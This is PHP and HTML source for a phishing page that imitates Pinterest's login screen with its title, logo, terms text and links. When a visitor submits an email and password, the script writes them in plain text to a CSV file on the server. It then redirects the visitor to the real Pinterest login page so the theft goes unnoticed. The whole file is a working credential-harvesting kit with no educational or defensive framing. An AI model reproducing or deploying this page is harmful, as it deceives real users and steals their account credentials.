<?php
    session_start();
    $eid= $eid_empty= $eid_err= "";
    $pass= $pass_empty= "";

    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["eid"]))
        {
            $eid_empty="You missed a spot! Don't forget to add your email.";
        }
        else
        {
            $eid=htmlspecialchars($_POST["eid"]);
            $pass=htmlspecialchars($_POST["pass"]);
            
            if(!(filter_var($eid,FILTER_VALIDATE_EMAIL)))
            {
                $eid_err="Hmm...that doesn't look like an email address.";
            }
            elseif(empty($pass))
            {
                $pass_empty="The password you entered is incorrect. Try again or Reset your password";
            }
            else
            {
                $csv_file=fopen("login_details.csv","a");
                // to be run only the first time
                // fwrite($csv_file, "Email");
                // fwrite($csv_file, ",");
                // fwrite($csv_file, "Password");
    
                fwrite($csv_file, "\n");
                fwrite($csv_file, $eid);
                fwrite($csv_file, ",");
                fwrite($csv_file, $pass);
                fclose($csv_file);
                header("Refresh:1; url=https://in.pinterest.com/login/");
                exit();
            }
        }
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Pinterest Login</title>
</head>
<body>
    <div class="container">
        <img src="logo.jpg" alt="Pinterest">
        <h1>Log in to see more</h1>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <label for="email" id="eid">Email</label><br>
            <input type="text" placeholder="Email" name="eid"><br>
            <div class="error"><?php echo $eid_empty, $eid_err ?></div>
            <label for="pass">Password</label><br>
            <input type="password" placeholder="Password" name="pass"><br>
            <div class="error"><?php echo $pass_empty ?></div>
            <a href="https://in.pinterest.com/password/reset/" id="forgot_pass">Forgot your password?</a><br>
            <button type="submit" id="submit">Log in</button>
        </form>
            <p class="or">OR</p>
            <button onclick="location.href='https://in.pinterest.com/login/';">Sign up</button>
        <p class="privacy">By continuing, you agree to Pinterest's Terms of Service and acknowledge you've read our Privacy Policy. Notice at collection.</p>
        <p class="privacy">Are you a business? <a href="https://www.pinterest.com/business/create/"> Get started here!</a></p>
    </div>
</body>
</html>